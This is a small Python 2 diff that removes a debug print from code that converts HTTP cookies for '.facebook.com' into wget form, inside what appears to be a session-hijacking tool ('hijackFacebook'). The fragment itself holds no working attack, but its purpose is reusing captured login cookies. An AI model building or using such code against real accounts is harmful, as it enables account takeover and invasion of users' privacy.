@@ -28,7 +28,6 @@ def hijackFacebook(Headers, ipsrc='', hook='', pkt='', session=''):
 def makeWgetFromHTTPCookies(a):
     Domain = ".facebook.com"
     DefaultPath = "/"
-    print "a = "+a
     AllCookies = "" # RESULT
     CookieList = a.split(';');
     ElementID = 0
